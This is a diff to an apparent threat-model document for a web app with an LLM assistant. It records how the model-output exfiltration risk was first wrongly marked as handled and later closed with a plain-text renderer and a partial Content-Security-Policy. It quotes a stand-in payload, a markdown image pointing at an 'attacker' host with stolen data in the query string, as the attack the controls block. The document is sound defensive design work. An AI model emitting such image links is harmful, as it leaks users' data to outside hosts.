@@ -470,24 +470,38 @@ made the ordering clear, and the ordering is the finding:
 
 "Output filtering" is deliberately NOT claimed as a control.
 
-**MODEL-OUTPUT EXFILTRATION IS AN OPEN RISK, NOT A HANDLED ONE.** An earlier
-draft of this paragraph credited PR4 with "restricted markdown, no autolinking,
-no remote images", which would stop a model-emitted
-`![](https://attacker/?data=…)` from becoming an exfiltration channel. **That
-control does not exist.** PR4 shipped the readiness surface only — deterministic
-analyser findings, rendered from enum codes by `apps/web/src/lib/findings.ts` —
-and there is no conversation UI, no markdown renderer, and no BFF conversation
-resolver anywhere in the repo. No model-authored text reaches a browser today,
-so the risk is not live; what was wrong was dispositioning it against a control
-nobody had built, which is the M4 legal-hold zero-callers shape and exactly how
-a gap survives review.
+**MODEL-OUTPUT EXFILTRATION — CLOSED IN M11, and worth reading as a history of
+how nearly it was not.** An M10 draft of this paragraph credited PR4 with
+"restricted markdown, no autolinking, no remote images". PR4 shipped no
+conversation UI and no renderer at all, so the paragraph dispositioned a live
+risk against a control nobody had built — the M4 legal-hold zero-callers shape,
+in prose. The M10 security review caught it and reopened the requirement, owed
+by whoever shipped the chat surface, in the same PR as the first pixel of
+model-authored text.
 
-The requirement therefore stands OPEN, owed by whoever ships the chat surface:
-model output must render through a restricted renderer with no autolinking and
-no remote image loading, and that constraint must arrive in the same PR as the
-first pixel of model-authored text. It is a rendering constraint, not a filter
-on model output — calling it filtering would overclaim — and until it exists
-this section must not be read as covering it.
+M11 is that PR, and the constraint is now real. `MessageText`
+(`apps/web/src/components/MessageText.tsx`) is the ONLY renderer any message
+gets, in either role, and it builds text nodes: no parser, no allowlist, no
+`dangerouslySetInnerHTML` (a source scan over the whole app enforces that, with
+`app/layout.tsx`'s theme script as the one declared exemption). A model-emitted
+`![](https://attacker/?data=…)` renders as those characters — verified in a real
+browser against a payload carrying a markdown image, a markdown link and a raw
+`<img>` tag: zero image elements, zero anchors to the payload's host, zero
+network requests to it.
+
+Behind it, and independent of it, the app now sends a Content-Security-Policy
+with `img-src 'self' data:` and `connect-src 'self'`, so the browser refuses a
+remote image load even if a future renderer regresses. **That CSP is
+deliberately not complete**: `script-src` still allows inline, because Next's
+hydration bootstrap and the theme script are inline and locking them down needs
+per-request nonces through middleware. Saying so plainly is the point — a
+stricter directive that gets relaxed under deploy pressure would be worse than
+an honest partial one.
+
+It remains a rendering constraint rather than a filter on model output; calling
+it filtering would overclaim. The cost is stated where it lands: answers render
+as plain prose with no lists or emphasis, and whoever adds formatting inherits
+this requirement, because adding a parser here is adding a sink.
 
 **TB5 — the LLM provider boundary.** The assistant is the isolating service:
 the provider SDK and its credential will exist only there (PR2). It holds NO
